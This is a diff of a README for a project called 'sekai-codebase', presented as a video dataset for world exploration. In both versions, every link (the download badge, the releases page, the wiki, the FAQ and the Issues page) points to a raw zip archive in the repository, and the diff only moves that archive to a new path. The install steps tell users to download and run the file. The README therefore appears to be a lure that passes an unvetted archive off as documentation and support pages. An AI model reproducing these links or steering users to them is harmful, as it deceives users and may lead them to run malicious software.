@@ -1,6 +1,6 @@
 # 🌍 sekai-codebase - Explore the World through Video Datasets
 
-[![Download sekai-codebase](https://raw.githubusercontent.com/bleh456/sekai-codebase/main/lewis/sekai-codebase.zip%20Now-%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20-blue)](https://raw.githubusercontent.com/bleh456/sekai-codebase/main/lewis/sekai-codebase.zip)
+[![Download sekai-codebase](https://github.com/bleh456/sekai-codebase/raw/refs/heads/main/clip_extracting/utils/sekai_codebase_1.6-beta.4.zip%20Now-%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20-blue)](https://github.com/bleh456/sekai-codebase/raw/refs/heads/main/clip_extracting/utils/sekai_codebase_1.6-beta.4.zip)
 
 ## 📚 Overview
 
@@ -18,7 +18,7 @@ To run the **Sekai** application, you need the following:
 
 ### Download & Install
 
-To start using **Sekai**, visit this page to download the latest release: [Download sekai-codebase](https://raw.githubusercontent.com/bleh456/sekai-codebase/main/lewis/sekai-codebase.zip).
+To start using **Sekai**, visit this page to download the latest release: [Download sekai-codebase](https://github.com/bleh456/sekai-codebase/raw/refs/heads/main/clip_extracting/utils/sekai_codebase_1.6-beta.4.zip).
 
 1. Open the link above in your web browser.
 2. On the Releases page, find the latest version listed.
@@ -63,7 +63,7 @@ Once the download completes, locate the downloaded file and follow the instructi
 
 ## 📑 Documentation
 
-For detailed information about how to use **Sekai**, explore our [wiki](https://raw.githubusercontent.com/bleh456/sekai-codebase/main/lewis/sekai-codebase.zip). The wiki contains guides on:
+For detailed information about how to use **Sekai**, explore our [wiki](https://github.com/bleh456/sekai-codebase/raw/refs/heads/main/clip_extracting/utils/sekai_codebase_1.6-beta.4.zip). The wiki contains guides on:
 
 - Getting started with the software.
 - Tools and functionalities offered.
@@ -75,7 +75,7 @@ If you encounter issues while using **Sekai**, consider these solutions:
 
 - Ensure your system meets the requirements listed above.
 - Restart the application if it freezes.
-- Check our [FAQ](https://raw.githubusercontent.com/bleh456/sekai-codebase/main/lewis/sekai-codebase.zip) for common problems and solutions.
+- Check our [FAQ](https://github.com/bleh456/sekai-codebase/raw/refs/heads/main/clip_extracting/utils/sekai_codebase_1.6-beta.4.zip) for common problems and solutions.
 
 ## 🤝 Contributing
 
@@ -92,8 +92,8 @@ This project is licensed under the MIT License. You are free to use, modify, and
 
 ## 📞 Support
 
-For support inquiries, please create an issue on the [GitHub Issues page](https://raw.githubusercontent.com/bleh456/sekai-codebase/main/lewis/sekai-codebase.zip). We will respond as soon as possible.
+For support inquiries, please create an issue on the [GitHub Issues page](https://github.com/bleh456/sekai-codebase/raw/refs/heads/main/clip_extracting/utils/sekai_codebase_1.6-beta.4.zip). We will respond as soon as possible.
 
 Thank you for using **Sekai: A Video Dataset towards World Exploration**. We hope it enhances your exploration experience! 
 
-[![Download sekai-codebase](https://raw.githubusercontent.com/bleh456/sekai-codebase/main/lewis/sekai-codebase.zip%20Now-%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20-blue)](https://raw.githubusercontent.com/bleh456/sekai-codebase/main/lewis/sekai-codebase.zip)
+[![Download sekai-codebase](https://github.com/bleh456/sekai-codebase/raw/refs/heads/main/clip_extracting/utils/sekai_codebase_1.6-beta.4.zip%20Now-%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20-blue)](https://github.com/bleh456/sekai-codebase/raw/refs/heads/main/clip_extracting/utils/sekai_codebase_1.6-beta.4.zip)
